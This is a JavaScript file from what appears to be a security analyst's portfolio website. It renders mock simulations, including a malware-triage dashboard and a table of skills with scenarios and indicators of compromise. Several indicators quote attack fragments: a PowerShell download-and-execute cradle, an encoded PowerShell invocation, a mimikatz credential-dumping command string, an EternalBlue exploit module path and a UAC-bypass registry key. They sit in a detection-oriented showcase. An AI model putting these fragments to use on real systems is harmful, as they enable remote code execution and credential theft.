            hmi('MULTI-POINT<br><span class="big">3 PHONES</span><br>pairing Blackberry…');
          },
          end() {
            phone('#btb-p3', '#btb-s3', 'linked', 'CONNECTED');
            hmi('MULTI-POINT ACTIVE<br><span class="big">3 PHONES</span><br>audio arbitration OK');
          }
        },
        { // 6. security: rogue pairing attempt
          dur: 3200,
          run() {
            phone('#btb-p4', '#btb-s4', '', 'PAIRING ATTEMPT');
            if (l4) { l4.activate(); l4.packets(4, 'var(--neon-3)', 0.6).on(); }
            hmi('PAIRING REQUEST<br><span class="big">00:11:22:33:44:55</span><br>no PIN provided…', false);
            timers.later(() => {
              hmi('PAIRING REJECTED<br><span class="big">⛔ ACCESS DENIED</span><br>discoverable mode OFF', true);
              phone('#btb-p4', '#btb-s4', 'blocked', 'REJECTED ✓');
            }, 1600);
          },
          end() {
            if (l4) l4.off();
            hmi('SECURITY CHECK<br><span class="big">ROGUE BLOCKED ✓</span>', false);
          }
        },
        { // 7. stress cycles
          dur: 3600,
          run() {
            if (l1) { l1.off(); l1.packets(4, 'var(--neon-2)', 0.5).on(); }
            if (l2) { l2.off(); l2.packets(3, 'var(--neon-2)', 0.6).on(); }
            if (l3) { l3.off(); l3.packets(3, 'var(--neon-2)', 0.6).on(); }
            let c = 0;
            const cyc = timers.every(() => {
              c = Math.min(1000, c + 37);
              hmi(`STRESS TEST<br><span class="big">${c} / 1000</span><br>connect ↔ disconnect`);
              if (c >= 1000) clearInterval(cyc);
            }, 100);
            timers.later(() => clearInterval(cyc), 3600);
          },
          end() {
            hmi('STRESS DONE<br><span class="big">1000 CYCLES ✓</span><br>0 deadlocks · 0 lost pairs');
          }
        }
      ];
      const total = vsRunSteps($('#btb-steps', host), timers, phases);
      timers.later(() => playBench(), total + 4200); // loop the bench
    }
    playBench();

    ctx.tabs = [
      { id: 'sim',    label: '// Live Simulation' },
      { id: 'bug',    label: '// Bugzilla Report' },
      { id: 'carkit', label: '// Car-Kit Live Test' }
    ];
  };

  /* =================================================================
   *  6. CYBERGUARDIAN — Malware Triage Simulation
   * ================================================================= */
  SIMS['cyberguardian-scan'] = (host, ctx) => {
    host.innerHTML = `
      <div class="sim-h">CYBERGUARDIAN — LOCAL MALWARE TRIAGE</div>
      <div class="sim-p">Multi-layered detection tool: scans running processes, files, registry, network connections & memory; correlates with YARA rules + VirusTotal (70+ AV engines) + AI-based analysis (OpenAI / Gemini / DeepSeek) for malware classification with automatic MITRE ATT&CK technique mapping.</div>

      <div class="sim-section active" data-sim="scan">
        <div class="cg-grid">
          <div class="cg-tile" data-tile="process">
            <div class="cg-tile-head"><span>PROCESS ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">Scanning PID 712 (svchost.exe)<br><span class="ioc">YARA match: malware_generic_loader</span><br>SHA256: 4f8c...e201<br><span class="ioc">VT: 38/72 detections</span><br>Behavior: parent=spoolsv.exe (suspicious chain)</div>
          </div>
          <div class="cg-tile" data-tile="file">
            <div class="cg-tile-head"><span>FILE ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">C:\\Users\\victim\\Downloads\\invoice.xlsm<br><span class="ioc">YARA match: maldoc_vba_macro</span><br>Entropy: 7.8 (packed)<br>PE: N/A (Office doc)<br><span class="ioc">VT: 41/72 detections</span><br>Macros: ENABLED (suspicious)</div>
          </div>
          <div class="cg-tile" data-tile="registry">
            <div class="cg-tile-head"><span>REGISTRY ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">HKCU\\Software\\Classes\\mscfile\\shell\\open\\command<br><span class="ioc">IFEO Debugger Injection detected!</span><br>Value: C:\\Windows\\Temp\\explorer.exe<br>Severity: CRITICAL persistence<br>Pattern: UAC bypass (eventvwr.exe)</div>
          </div>
          <div class="cg-tile" data-tile="network">
            <div class="cg-tile-head"><span>NETWORK ANALYSIS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">Process: powershell.exe PID=4812<br>Remote: 192.168.56.103:443<br><span class="ioc">VT IP reputation: 12/92 malicious</span><br>Beaconing detected: 60s interval<br>C2 pattern: HTTP POST /check-in<br>ASN: AS-THREAT-ACTOR-2049</div>
          </div>
          <div class="cg-tile" data-tile="memory">
            <div class="cg-tile-head"><span>MEMORY FORENSICS</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body">PID 712 (svchost.exe)<br>SeDebugPrivilege: ENABLED<br><span class="ioc">Injected code: 0x1a400000</span><br>YARA in memory: mimikatz_signature<br>Strings: "sekurlsa::logonpasswords"<br>IOC: lsass.dmp handle open</div>
          </div>
          <div class="cg-tile" data-tile="ai">
            <div class="cg-tile-head"><span>AI ANALYSIS — DEEPSEEK</span><span class="cg-status">●</span></div>
            <div class="cg-tile-body"><span class="ok">Verdict: MALICIOUS</span><br>Confidence: 94.7%<br>Risk score: 9.2/10<br>Threat type: Trojan + Credential Stealer<br>MITRE: T1059.001, T1003.001, T1053.005<br>Recommendation: isolate host, dump + analyze</div>
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="ai">
        <div class="sim-h">AI PROMPT + RESPONSE FLOW</div>
        <pre class="code-viewer"><span class="c">// ai_analysis/analyzer.py — analyze_detection()</span>

<span class="k">prompt</span> = <span class="s">"""
You are a senior malware analyst. Classify this detection:

DETECTION: IFEO Debugger Injection
RISK LEVEL: CRITICAL
FILE PATH: C:\\Windows\\Temp\\explorer.exe
REGISTRY KEY: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command
YARA MATCHES: uac_bypass_eventvwr
VIRUSTOTAL: 41/72 detections
NETWORK: beacon to 192.168.56.103:443 every 60s

Map to MITRE ATT&CK. Recommend containment.
"""</span>

<span class="c"># Provider selection: DEEPSEEK (default) | OPENAI | GEMINI</span>
result = analyzer.analyze_detection(detection, <span class="k">provider</span>=AIProvider.DEEPSEEK)

<span class="c"># Returns AnalysisResult dataclass</span>
{
  <span class="s">"verdict"</span>:          <span class="s">"MALICIOUS"</span>,
  <span class="s">"confidence"</span>:       <span class="n">0.947</span>,
  <span class="s">"risk_score"</span>:      <span class="n">9.2</span>,
  <span class="s">"recommendations"</span>:  [<span class="s">"Isolate host"</span>, <span class="s">"Block C2 IP"</span>, <span class="s">"Run Volatility on RAM"</span>],
  <span class="s">"indicators"</span>:       [<span class="s">"192.168.56.103"</span>, <span class="s">"sha256:4f8c..."</span>],
  <span class="s">"mitre_techniques"</span>: [<span class="s">"T1548.002"</span>, <span class="s">"T1059.001"</span>, <span class="s">"T1003.001"</span>],
  <span class="s">"threat_type"</span>:      <span class="s">"Trojan.CredStealer"</span>
}</pre>
      </div>
    `;

    // animate tile scan states
    const tiles = $$('.cg-tile', host);
    tiles.forEach((t, i) => {
      t.classList.add('scanning');
      setTimeout(() => {
        t.classList.remove('scanning');
        const isThreat = !t.querySelector('[data-tile="ai"]');
        if (isThreat) t.classList.add('threat');
        else t.classList.add('clean');
      }, 800 + i * 600);
    });

    ctx.tabs = [
      { id: 'scan', label: '// Scan Output' },
      { id: 'ai',   label: '// AI Analysis' }
    ];
  };

  /* =================================================================
   *  7. HOME LAB — Attack Chain (same as soc-homelab but tabs differ)
   * ================================================================= */
  /* =================================================================
   *  8. SKILL SIMULATIONS — keyed by skill name
   *     Renders a contextual mini-sim calibrated to the skill level
   * ================================================================= */
  const SKILL_SIMS = {};  // (deprecated — all skills now route through visualLiveSim)
  // =========================================================================
  //  SKILL MODAL — 3-tab structure (Sources / Proficiency / Live Simulation)
  //  Every skill gets this structure regardless of whether a specific
  //  SKILL_SIMS[key] renderer exists. Specific renderers populate only the
  //  Live Simulation tab; generic skills get a level-calibrated live sim.
  // =========================================================================
  function levelDescriptor(lvl) {
    switch (lvl) {
      case 'beginner':     return 'Aware of the tool, can execute basic operations with documentation, still learning the workflow.';
      case 'intermediate': return 'Comfortable in production-like environments, can troubleshoot independently, contributes to team knowledge.';
      case 'advanced':     return 'Owns end-to-end workflows, trains others, makes architecture decisions, handles edge cases.';
      case 'expert':       return 'Recognised authority, sets standards, reviews others\' work, handles novel scenarios.';
      default:             return '—';
    }
  }

  function escapeHtmlS(s) {
    return String(s)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  // ---- Tab 1: SOURCES ----
  function renderSourcesSection(skill) {
    const cap = (skill.level || '').toUpperCase();
    const pct = skill.percent;
    return `
      <div class="skill-modal-grid">
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">${escapeHtmlS(skill.name)}</span>
            <span class="skill-modal-lvl">${cap}</span>
          </div>
          <div class="sim-p">Proficiency self-assessed at <strong style="color:var(--neon)">${cap.charAt(0) + cap.slice(1).toLowerCase()}</strong> (${pct}%). Demonstrated via the following sources:</div>
          <ul class="skill-sources-list">
            ${skill.sources.map(s => `<li><span class="src-mark">▸</span> ${escapeHtmlS(s)}</li>`).join('')}
          </ul>
          <div class="sim-p" style="margin-top:14px;font-size:11px;color:var(--fg-dim);line-height:1.6">
            <strong style="color:var(--neon-2)">Level meaning:</strong><br>
            ${levelDescriptor((skill.level || '').toLowerCase())}
          </div>
        </div>
        <div class="skill-modal-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">where this skill was applied</span>
          </div>
          <div class="sim-p" style="font-size:12px;color:var(--fg-soft);line-height:1.7">
            Each source above corresponds to a concrete environment where the skill was exercised:
          </div>
          <ul class="source-context-list">
            ${skill.sources.map(src => {
              const ctx = sourceContext(src);
              return `<li><strong style="color:var(--neon-2)">${escapeHtmlS(src)}</strong><br><span style="color:var(--fg-dim);font-size:11px">${ctx}</span></li>`;
            }).join('')}
          </ul>
        </div>
      </div>
    `;
  }

  function sourceContext(src) {
    const map = {
      'Sagemcom':      'Protocol-level vulnerability testing on ISP broadband gateways (BBox3, Vodafone, KDG, TalkTalk, Telia, KPN) — 5 years, 800+ findings.',
      'LibertyGlobal': 'Senior vulnerability analysis on DOCSIS 3.0/3.1 Cable + XGS-PON Fibre products — 3 years, led team of 8 on XGS-PON.',
      'Capgemini':     'Mobile & web test automation for AXA Assurance France (iOS/Android) — Selenium, Appium, Azure DevOps, shift-left security.',
      'TryHackMe':     '400+ hands-on rooms completed, top 1% globally (rank ~2637). SOC Level 1 & 2 paths, Jr Penetration Tester path.',
      'HTB':           'HackTheBox defensive & offensive labs — SOC, forensics, and detection engineering hands-on practice.',
      'HTB CDSA':      'HackTheBox Certified Defensive Security Analyst exam — full attack-chain reconstruction, Splunk SPL, Sigma rules.',
      'Home Lab':      'Personal SOC + Pentest home lab (VirtualBox: DC, victim, web server, attacker Kali) — 9-phase attack chain with detections.',
      'Udemy':         'Self-authored 16-course cybersecurity curriculum on Udemy — 1,100+ students enrolled.'
    };
    return map[src] || 'Hands-on practice and applied exercises.';
  }

  // ---- Tab 2: PROFICIENCY RADAR ----
  function renderRadarSection(skill) {
    const lvl = (skill.level || '').toLowerCase();
    const pct = skill.percent;
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    const tiers = [
      { label: 'Newbie',     pct: 20 },
      { label: 'Basic',      pct: 40 },
      { label: 'Working',    pct: 60 },
      { label: 'Pro',        pct: 80 },
      { label: 'Expert',     pct: 100 }
    ];
    return `
      <div class="radar-wrap">
        <div class="skill-modal-head" style="margin-bottom:16px">
          <span class="skill-modal-name">${escapeHtmlS(skill.name)} — proficiency radar</span>
          <span class="skill-modal-lvl">${cap.toUpperCase()}</span>
        </div>
        <div class="radar-bars">
          ${tiers.map((t, i) => {
            const active = t.pct <= pct;
            const isCurrent = (i === Math.floor(pct / 20) - (pct % 20 === 0 ? 1 : 0)) || (pct === 100 && i === tiers.length - 1);
            return `
              <div class="radar-bar ${active ? 'active' : ''} ${isCurrent ? 'current' : ''}">
                <div class="radar-bar-fill" style="height:${active ? Math.max(20, t.pct) : 8}px"></div>
                <div class="radar-bar-lbl">${t.label}</div>
                <div class="radar-bar-pct">${t.pct}%</div>
              </div>
            `;
          }).join('')}
        </div>
        <div class="radar-summary">
          <div class="radar-summary-line">
            <span class="rs-key">CURRENT_LEVEL</span>
            <span class="rs-val" style="color:var(--neon)">${cap}</span>
          </div>
          <div class="radar-summary-line">
            <span class="rs-key">MASTERY_PCT</span>
            <span class="rs-val">${pct}%</span>
          </div>
          <div class="radar-summary-line">
            <span class="rs-key">NEXT_MILESTONE</span>
            <span class="rs-val" style="color:var(--neon-2)">${nextMilestone(pct, cap)}</span>
          </div>
        </div>
        <div class="radar-descriptor">
          <strong style="color:var(--neon-2)">Simulation calibrated to level:</strong>
          <span>${levelDescriptor(lvl)}</span>
        </div>
      </div>
    `;
  }

  function nextMilestone(pct, cap) {
    if (pct >= 100) return 'Maintain and teach others';
    if (pct >= 80)  return 'Expert (100%) — set standards, review peers';
    if (pct >= 60)  return 'Advanced (80%) — own end-to-end workflows';
    if (pct >= 40)  return 'Pro (60%) — troubleshoot independently';
    if (pct >= 20)  return 'Working (40%) — comfortable in production';
    return 'Basic (20%) — operate with documentation';
  }

  /* =================================================================
   *  8. SKILL SIMULATIONS — visual, dynamic, level-calibrated
   *     Every skill gets a unique visual simulation. A per-skill
   *     metadata table (SKILL_META) drives category-aware templates
   *     (SKILL_TEMPLATES) that produce a visual diagram + animated
   *     terminal output + level-appropriate scenario.
   * ================================================================= */
  /* ---------- Per-skill metadata table (72 skills) ---------- */
  const SKILL_META = {
    // === SIEM & DETECTION (10) ===
    'Splunk SPL':                { cat: 'siem',       icon: '📡', role: 'SOC L2 Analyst',        scene: 'Hunt privilege-escalation attempts across the fleet', tool: 'Splunk SPL query', ioc: 'eventvwr.exe spawning PowerShell with -ExecutionPolicy Bypass' },
    'Splunk CIM':                { cat: 'siem',       icon: '🔄', role: 'Detection Engineer',    scene: 'Normalize raw logs into the Common Information Model',  tool: 'CIM data model',   ioc: ' sourcetype=WinEventLog:Security not properly tagged' },
    'Splunk Alerts/Dashboards':  { cat: 'siem',       icon: '📊', role: 'SOC Lead',              scene: 'Build a SOC KPI dashboard for management review',         tool: 'Splunk Dashboard', ioc: 'Top 5 MITRE tactics by event count' },
    'Sysmon':                    { cat: 'siem',       icon: '🩺', role: 'Detection Engineer',    scene: 'Deploy Sysmon v15 with a tuned config + ship to Splunk',  tool: 'Sysmon Event ID 1', ioc: 'powershell.exe -enc <base64>' },
    'Windows Event Logs':        { cat: 'siem',       icon: '📜', role: 'SOC Analyst',           scene: 'Triage Security events 4624, 4688, 4698',                 tool: 'Event ID 4624',    ioc: 'Logon Type 3 from non-domain host' },
    'Kibana':                    { cat: 'siem',       icon: '📈', role: 'SOC Analyst',          scene: 'Pivot from Kibana dashboard to raw documents',            tool: 'KQL query',        ioc: 'process.name: "powershell.exe"' },
    'Log Parsing':               { cat: 'siem',       icon: '🔬', role: 'Detection Engineer',    scene: 'Parse raw syslog into structured fields for SIEM',        tool: 'Regex + transforms', ioc: 'unparseable auth log lines' },
    'Sigma Rule Authoring':      { cat: 'siem',       icon: '🛡️', role: 'Detection Engineer',    scene: 'Author Sigma rule for persistence via scheduled task',    tool: 'Sigma YAML',      ioc: 'schtasks /create /tn SystemHealth' },
    'Detection Engineering':     { cat: 'siem',       icon: '⚙️', role: 'Detection Engineer',    scene: 'Lifecycle: hypothesis → rule → test → tune → deploy',     tool: 'Detection lifecycle', ioc: 'false-positive rate spike on rule win_persistence' },
    'Alert Triage':              { cat: 'siem',       icon: '🚨', role: 'SOC L1 Analyst',       scene: 'Triage an alert: investigate → escalate or close',        tool: 'Ticket workflow',  ioc: 'Alert 4711 — Mimikatz signature in DNS' },

    // === THREAT HUNTING & FORENSICS (10) ===
    'Hypothesis-driven Hunting':              { cat: 'forensics', icon: '🎯', role: 'Threat Hunter',     scene: 'Hunt for C2 beaconing in DNS logs',           tool: 'Hypothesis hunt',    ioc: 'DNS queries with low-TTL + high-frequency pattern' },
    'Network Forensics / Packet Analysis':     { cat: 'forensics', icon: '🔍', role: 'Forensics Analyst', scene: 'Analyze a packet capture for data exfiltration', tool: 'Wireshark + tshark', ioc: 'Large outbound DNS payload on TXT records' },
    'Memory Forensics (Volatility 3)':         { cat: 'forensics', icon: '🧠', role: 'Forensics Analyst', scene: 'Dump RAM → scan for malicious processes',       tool: 'volatility 3',      ioc: 'lsass.exe with malicious handle' },
    'Disk Forensics (Autopsy)':                { cat: 'forensics', icon: '💾', role: 'Forensics Analyst', scene: 'Image disk → enumerate recently-touched files', tool: 'Autopsy',            ioc: 'Prefetch shows powershell.exe @ 02:11:42' },
    'Disk Forensics (FTK Imager)':             { cat: 'forensics', icon: '💿', role: 'Forensics Analyst', scene: 'Create a forensic image + verify with hash',    tool: 'FTK Imager',         ioc: 'MD5 / SHA1 mismatch on sector 1024' },
    'Malware Analysis (YARA)':                 { cat: 'forensics', icon: '🦠', role: 'Malware Analyst',    scene: 'Write YARA rule → scan suspicious binaries',    tool: 'YARA rule',           ioc: 'ImportNTDLL + Anti-VM strings' },
    'Malware Analysis (PEStudio)':             { cat: 'forensics', icon: '🔬', role: 'Malware Analyst',    scene: 'Static-analyze a suspicious PE in PEStudio',   tool: 'PEStudio',           ioc: 'High-entropy .text section + import anomalies' },
    'Process Analysis (Procmon)':              { cat: 'forensics', icon: '⚙️', role: 'Forensics Analyst', scene: 'Trace process activity with Procmon',           tool: 'Procmon + filters',  ioc: 'RegSetValue HKCU\\...\\Run\\Updater' },
    'KAPE':                                    { cat: 'forensics', icon: '📦', role: 'Forensics Analyst', scene: 'Collect targeted artifacts with KAPE',          tool: 'KAPE module',        ioc: 'kape collected 1842 artifacts in 47s' },
    'Steganography Detection':                 { cat: 'forensics', icon: '🖼️', role: 'Forensics Analyst', scene: 'Hunt for hidden payloads in images',            tool: 'stegsolve + zsteg',  ioc: 'LSB encoding in PNG channel R' },

    // === PENETRATION TESTING & VA (9) ===
    'Nmap':             { cat: 'pentest', icon: '🗺️', role: 'Pentester',    scene: 'Fingerprint attack surface of an XGS-PON gateway', tool: 'nmap',                ioc: 'TCP 7547 open (TR-069 CWMP)' },
    'Wireshark':        { cat: 'pentest', icon: '🦈', role: 'Pentester',    scene: 'Deep packet inspection during a VoIP pentest',      tool: 'Wireshark',           ioc: 'REGISTER flood on port 5060' },
    'tcpdump':          { cat: 'pentest', icon: '📡', role: 'Pentester',    scene: 'Capture live traffic on CPE interface',             tool: 'tcpdump',             ioc: 'C2 beacon every 60s on port 443' },
    'OSINT Framework':  { cat: 'pentest', icon: '🕵', role: 'Pentester',   scene: 'Recon target organization from public sources',     tool: 'OSINT Framework',     ioc: 'LinkedIn → 47 employees with valid email pattern' },
    'OWASP Top 10':     { cat: 'pentest', icon: '🌐', role: 'Pentester',    scene: 'Test a web app against OWASP Top 10',               tool: 'OWASP Top 10',        ioc: 'SQLi on /search?q= parameter' },
    'CVSS v3.1':        { cat: 'pentest', icon: '📊', role: 'VA Engineer',  scene: 'Score a finding with CVSS v3.1',                    tool: 'CVSS v3.1 calculator', ioc: 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 CRITICAL' },
    'NIST SP 800-115':  { cat: 'pentest', icon: '📋', role: 'VA Engineer',  scene: 'Follow NIST 800-115 methodology for a VA engagement', tool: 'NIST 800-115 phases', ioc: 'Phase 3 — Vulnerability Verification' },
    'Burp Suite':       { cat: 'pentest', icon: '🕷️', role: 'Pentester',    scene: 'Intercept & fuzz a web app with Burp Suite',         tool: 'Burp Repeater',       ioc: 'XSS in /comment body, bypass filter' },
    'Metasploit':       { cat: 'pentest', icon: '💥', role: 'Pentester',    scene: 'Validate a finding with a Metasploit module',        tool: 'msfconsole',          ioc: 'exploit/windows/smb/ms17_010_eternalblue' },

    // === NETWORKING & PROTOCOLS (22) ===
    'TCP/IP':                   { cat: 'networking', icon: '🌐', role: 'Network Engineer',  scene: 'Trace routing path between CPE and ISP core',          tool: 'traceroute + ping', ioc: 'TTL=1 returned from core — routing loop' },
    'DHCP':                     { cat: 'networking', icon: '🔌', role: 'Network Engineer',  scene: 'Verify the DHCP DORA sequence',                         tool: 'DHCP DORA',         ioc: 'NAK on Requested-IP — conflict detected' },
    'DNS':                      { cat: 'networking', icon: '📒', role: 'Network Engineer',  scene: 'Trace a DNS lookup chain',                              tool: 'dig + nslookup',    ioc: 'NXDOMAIN flood — random subdomains → C2' },
    'HTTP/HTTPS':               { cat: 'networking', icon: '🔒', role: 'Web Engineer',     scene: 'Inspect HTTP request/response and TLS handshake',     tool: 'curl + openssl',    ioc: 'Mixed content warning on /api/login' },
    'SIP/RTP':                  { cat: 'networking', icon: '📞', role: 'VoIP Engineer',     scene: 'Diagnose a SIP registration failure',                  tool: 'sipsak + sngrep',   ioc: '403 Forbidden — auth nonce mismatch' },
    'SSH':                      { cat: 'networking', icon: '🔐', role: 'Systems Admin',    scene: 'SSH into a gateway and inspect config',                 tool: 'ssh + key auth',    ioc: 'root login over SSH with weak cipher' },
    'TLS':                      { cat: 'networking', icon: '🛡️', role: 'Security Engineer', scene: 'Inspect TLS cipher suite on a public endpoint',         tool: 'openssl s_client',  ioc: 'TLSv1.0 still offered — deprecated' },
    'TR-069 / CWMP':            { cat: 'networking', icon: '🛠️', role: 'CPE Engineer',    scene: 'Push a firmware update via TR-069',                     tool: 'ACS + CWMP',        ioc: 'Connection Request to CPE timeout' },
    'ARP':                      { cat: 'networking', icon: '🔁', role: 'Network Engineer',  scene: 'Hunt for ARP spoofing on the LAN',                      tool: 'arpwatch',          ioc: 'Two MACs answering for 192.168.1.1' },
    'ICMP':                     { cat: 'networking', icon: '📡', role: 'Network Engineer',  scene: 'Ping / traceroute to diagnose connectivity',             tool: 'ping + traceroute', ioc: 'ICMP redirect from non-gateway host' },
    'GRE':                      { cat: 'networking', icon: '🕳️', role: 'Network Engineer',  scene: 'Verify a GRE tunnel between sites',                     tool: 'ip tunnel + tcpdump', ioc: 'MTU fragmentation in tunnel' },
    'PPP':                      { cat: 'networking', icon: '🔗', role: 'Network Engineer',  scene: 'Inspect a PPPoE session',                                tool: 'pppoe + pppd',      ioc: 'LCP echo timeout — flapping line' },
    'WiFi WPA2/WPA3/WiFi 6':    { cat: 'networking', icon: '📶', role: 'WiFi Engineer',     scene: 'Validate WPA3-SAE handshake on a new AP',               tool: 'wpa_supplicant',    ioc: 'Downgrade attack — WPA3 → WPA2 transitional' },
    'DOCSIS':                   { cat: 'networking', icon: '📺', role: 'Cable Engineer',    scene: 'Validate DOCSIS 3.1 channel bonding',                   tool: 'cmctl + spectrum',  ioc: 'Uncorrected FEC errors on downstream channel 4' },
    'XGPON':                    { cat: 'networking', icon: '💡', role: 'Fibre Engineer',    scene: 'Validate XGS-PON OLT authentication',                    tool: 'OLT CLI + ONT GUI',  ioc: 'LOS alarm on PON port 1/0/2' },
    'VoIP Security':            { cat: 'networking', icon: '📞', role: 'Voice Engineer',     scene: 'Audit SIP/RTP security controls',                       tool: 'SIP audit + SRTP',  ioc: 'RTP flowing on unencrypted UDP 10000' },
    'Firewall':                 { cat: 'networking', icon: '🧱', role: 'Security Engineer', scene: 'Audit firewall rules and detect shadowed entries',      tool: 'fwbuilder + audit', ioc: 'Rule 47 shadows rules 12, 18, 23' },
    'ACL':                      { cat: 'networking', icon: '📋', role: 'Network Engineer',  scene: 'Inspect and tune ACLs on a core switch',                tool: 'switch CLI',        ioc: 'permit any any at end of list = implicit deny bypassed' },
    'NAT':                      { cat: 'networking', icon: '🔀', role: 'Network Engineer',  scene: 'Troubleshoot a NAT translation issue',                  tool: 'show xlate + pcap', ioc: 'Pool exhaustion — port translation full' },
    'QoS':                      { cat: 'networking', icon: '⚡', role: 'Network Engineer',  scene: 'Validate QoS policy on a VoIP class',                   tool: 'show policy-map',   ioc: 'Voice queue dropping 7% of packets' },
    'IPSec':                    { cat: 'networking', icon: '🛡️', role: 'VPN Engineer',      scene: 'Verify an IPSec site-to-site tunnel',                   tool: 'ipsec + ikev2',     ioc: 'Phase 2 SA mismatch — local AES-256 vs peer AES-128' },
    'AES Encryption':           { cat: 'networking', icon: '🔒', role: 'Security Engineer', scene: 'Inspect AES key strength and mode',                     tool: 'openssl + audit',   ioc: 'AES-128-CBC with reused IV — pattern leakage' },

    // === CLOUD & DEVSECOPS (5) ===
    'Azure':          { cat: 'devops', icon: '☁️', role: 'Cloud Engineer',    scene: 'Deploy a hardened app to Azure App Service',  tool: 'Azure CLI',         ioc: 'Public blob container exposes secrets' },
    'Docker':         { cat: 'devops', icon: '🐳', role: 'DevOps Engineer',   scene: 'Run a multi-container test bench with docker-compose', tool: 'docker-compose',  ioc: 'Container runs as root — no USER directive' },
    'Jenkins':        { cat: 'devops', icon: '🔧', role: 'DevOps Engineer',   scene: 'Configure a Jenkins pipeline with security gates',     tool: 'Jenkinsfile',      ioc: 'Pipeline step "SAST" skipped via --exclude' },
    'GitHub Actions': { cat: 'devops', icon: '⚙️', role: 'DevOps Engineer',   scene: 'Build a CI workflow with SAST + dependency scan',        tool: '.github/workflows', ioc: 'Workflow uses action pinned to @main — supply-chain risk' },
    'TheHive':        { cat: 'devops', icon: '🐝', role: 'SOC Engineer',      scene: 'Triage an incident in TheHive with observables',         tool: 'TheHive case template', ioc: 'Observable 8.8.8.8 → 12 linked alerts' },

    // === FRAMEWORKS & STANDARDS (8) ===
    'MITRE ATT&CK':           { cat: 'framework', icon: '🎯', role: 'Detection Engineer', scene: 'Map detections to ATT&CK techniques',                 tool: 'ATT&CK Navigator',  ioc: 'Coverage gap in T1053.005' },
    'Cyber Kill Chain':       { cat: 'framework', icon: '⛓️', role: 'SOC Analyst',         scene: 'Map a multi-stage intrusion to the Kill Chain',       tool: 'Kill Chain phases', ioc: 'Recon → Weaponization → Delivery → Exploit → ...' },
    'Diamond Model':          { cat: 'framework', icon: '💎', role: 'Threat Intel Analyst', scene: 'Model an intrusion using Diamond Model',             tool: 'Diamond model',     ioc: 'Adversary ↔ Infrastructure ↔ Capability ↔ Victim' },
    'NIST SP 800-61r2':       { cat: 'framework', icon: '📋', role: 'IR Lead',              scene: 'Run an incident through NIST 800-61 lifecycle',        tool: 'IR lifecycle',      ioc: 'Phase: Containment, Eradication, Recovery' },
    'NIST CSF 2.0':           { cat: 'framework', icon: '🏛️', role: 'GRC Analyst',          scene: 'Map a control gap to NIST CSF 2.0 functions',         tool: 'CSF 2.0 profiles',  ioc: 'PR.AC-1 weak — devices lack MFA' },
    'ISO 27001:2022 Annex A': { cat: 'framework', icon: '🌍', role: 'GRC Analyst',          scene: 'Audit ISO 27001 Annex A control A.8.9',                tool: 'Annex A controls',  ioc: 'A.8.9 — configuration management evidence missing' },
    'STRIDE':                 { cat: 'framework', icon: '🛡️', role: 'Threat Modeler',       scene: 'Apply STRIDE to an auth flow',                         tool: 'STRIDE categories', ioc: 'Spoofing on password-reset endpoint' },
    'CVE':                    { cat: 'framework', icon: '🐞', role: 'VA Engineer',           scene: 'Investigate a CVE affecting production',              tool: 'NVD + CVSS',        ioc: 'CVE-2024-1234 in openssl 1.1.1k' },

    // === SCRIPTING & AUTOMATION (8) — note: 6 of these use scripting cat, 2 use devops ===
    'Python':          { cat: 'scripting', icon: '🐍', role: 'Automation Engineer', scene: 'Build a process scanner with psutil + YARA',          tool: 'Python script',     ioc: 'psutil.NoSuchProcess handled — pid died mid-scan' },
    'PowerShell':      { cat: 'scripting', icon: '💠', role: 'Windows Engineer',   scene: 'Hunt for suspicious PowerShell cradles',                tool: 'PowerShell script', ioc: 'IEX (New-Object Net.WebClient).DownloadString' },
    'Bash':            { cat: 'scripting', icon: '🐚', role: 'Linux Engineer',     scene: 'Automate a log audit with bash + grep + awk',            tool: 'bash + awk',        ioc: 'Failed SSH logins from 51.91.8.0/24 (60 attempts/min)' },
    'Java':            { cat: 'scripting', icon: '☕', role: 'SDET',               scene: 'Drive a Selenium test suite in Java on Azure',           tool: 'Java + TestNG',     ioc: 'TestNG suite.xml — 42 tests, 3 failed' },
    'Selenium':         { cat: 'scripting', icon: '🕷️', role: 'SDET',              scene: 'Automate a web login flow with Selenium WebDriver',     tool: 'Selenium + Java',   ioc: 'Element not interactable — Angular renders after click' },
    'Appium':          { cat: 'scripting', icon: '📱', role: 'SDET',              scene: 'Run an iOS + Android parallel test with Appium',        tool: 'Appium grid',       ioc: 'iOS element @name mismatched across devices' },
    'CI/CD (Jenkins)': { cat: 'devops',    icon: '🔄', role: 'DevOps Engineer',   scene: 'Wire a CI pipeline with shift-left security gates',     tool: 'Jenkinsfile',       ioc: 'Build #47 failed — Trivy found 2 HIGH CVEs' },
    'Jira':            { cat: 'devops',    icon: '🎫', role: 'QA Engineer',       scene: 'Triage a critical bug ticket with reproducible steps', tool: 'Jira ticket',       ioc: 'KDG-2018-0917 CRITICAL — boot loop on factory reset' }
  };

  /* ---------- shared visual helpers ---------- */
  function lvlLine(lvl, kind) {
    const m = {
      beginner:     { open: 'guided walkthrough',        close: 'need to consult docs at each step' },
      intermediate: { open: 'typical daily workflow',    close: 'independent troubleshooting, no escalation' },
      advanced:     { open: 'multi-step investigation',  close: 'produces a remediation proposal' },
      expert:       { open: 'standards-setting scenario', close: 'drafts the new team standard + mentors 2 engineers' }
    };
    return (m[lvl] || m.intermediate)[kind];
  }

  function levelIntro(skill, meta) {
    const lvl = (skill.level || '').toLowerCase();
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    return `<strong>${escapeHtmlS(skill.name)}</strong> @ <strong style="color:var(--neon-2)">${cap}</strong> level — ${escapeHtmlS(meta.role)}.
    Scenario: ${escapeHtmlS(meta.scene)}. IOC this run: <span class="code-inline">${escapeHtmlS(meta.ioc)}</span>.`;
  }

  function lvlLines(lvl, name) {
    const t = ts();
    const l = lvl.toLowerCase();
    if (l === 'beginner') {
      return [
        `$ # ${name} — guided walkthrough @ ${t}`,
